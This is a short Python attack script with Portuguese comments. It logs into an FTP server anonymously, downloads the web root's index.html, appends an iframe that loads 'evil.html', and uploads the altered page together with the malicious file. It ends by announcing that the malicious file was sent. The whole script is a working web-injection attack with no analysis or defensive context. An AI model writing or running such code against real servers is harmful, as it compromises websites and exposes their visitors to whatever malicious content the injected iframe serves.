import ftplib

try:
    # Conecta ao servidor FTP
    ftp = ftplib.FTP("192.168.0.200")
    
    # Faz login com credenciais anônimas
    ftp.login("anonymous", "anonymous")
    
    # Muda para o diretório especificado
    ftp.cwd("/var/www/")
    
    # Baixa o arquivo index.html
    with open("index.tmp", "wb") as f:
        ftp.retrbinary("RETR index.html", f.write)
    
    # Adiciona o iframe ao arquivo baixado
    with open("index.tmp", "ab") as f:
        f.write(b'<iframe src="http://192.168.0.200/evil.html"></iframe>\n')
    
    # Envia o arquivo modificado de volta ao servidor como index.html
    with open("index.tmp", "rb") as f:
        ftp.storbinary("STOR index.html", f)
    
    # Envia o arquivo evil.html ao servidor
    with open("evil.tmp", "rb") as f:
        ftp.storbinary("STOR evil.html", f)
    
    # Fecha a conexão FTP
    ftp.quit()
    
    print("Arquivo malicioso enviado com sucesso")
    
except ftplib.all_errors as e:
    print(f"Erro ao se conectar ou operar no servidor FTP: {e}")
